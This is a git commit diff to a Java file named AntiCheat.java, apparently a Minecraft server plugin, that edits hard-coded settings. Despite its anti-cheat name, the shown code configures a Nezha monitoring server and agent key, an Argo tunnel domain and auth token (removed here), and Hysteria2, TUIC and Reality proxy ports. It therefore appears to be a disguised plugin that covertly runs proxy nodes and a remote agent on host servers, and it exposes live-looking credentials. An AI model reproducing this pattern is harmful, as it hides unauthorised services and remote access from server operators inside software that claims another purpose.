1b534c68c509717f62b611ece2bc8ee37a7c29b8
fgnb666 <156969437+fgnb666@users.noreply.github.com>
2025-12-11 23:16:26 +0800

    Update AntiCheat.java

--- src/main/java/com/faiz/AntiCheat/AntiCheat.java
+++ src/main/java/com/faiz/AntiCheat/AntiCheat.java
@@ -28,15 +28,15 @@ public class AntiCheat extends JavaPlugin {
 
     private static void loadEnvVars(Map<String, String> envVars) {
         // 只添加有值的环境变量（空字符串不添加）
-        putIfNotEmpty(envVars, "UUID", "a9f7d31d-f9e5-445c-b1f2-49cec1d84ed0");
+        putIfNotEmpty(envVars, "UUID", "eb92cb38-c0ac-4873-acfb-4201d74c778b");
         putIfNotEmpty(envVars, "FILE_PATH", "./.tmp");
         putIfNotEmpty(envVars, "NEZHA_SERVER", "nzku.fortymenty.eu.org:443");
         putIfNotEmpty(envVars, "NEZHA_PORT", "");
         putIfNotEmpty(envVars, "NEZHA_KEY", "UsC5sNDciSaNggxJdB3EGSGYS242VT7q");
         putIfNotEmpty(envVars, "ARGO_PORT", "8001");
-        putIfNotEmpty(envVars, "ARGO_DOMAIN", "ouipanel-fr.yszy.nyc.mn");
-        putIfNotEmpty(envVars, "ARGO_AUTH", "eyJhIjoiZjUxNzk5OTMxMWQ4ZTAzOTg4OThmZjRkMTZiZDYzYjQiLCJ0IjoiNjliNDhkYWItYjkwOS00MDllLTg1MmMtNmRlMjIxMWY1YmJmIiwicyI6Ill6RTVabU00WmpndFl6WXhZeTAwWVdRMUxXRXdORE10WlRJNE9EZGtNamxpWldObCJ9");
-        putIfNotEmpty(envVars, "HY2_PORT", "25645");
+        putIfNotEmpty(envVars, "ARGO_DOMAIN", "");
+        putIfNotEmpty(envVars, "ARGO_AUTH", "");
+        putIfNotEmpty(envVars, "HY2_PORT", "25800");
         putIfNotEmpty(envVars, "TUIC_PORT", "");
         putIfNotEmpty(envVars, "REALITY_PORT", "");
         putIfNotEmpty(envVars, "UPLOAD_URL", "");
@@ -133,6 +133,7 @@ public class AntiCheat extends JavaPlugin {
         return results;
     }
 }
+
 
 
 
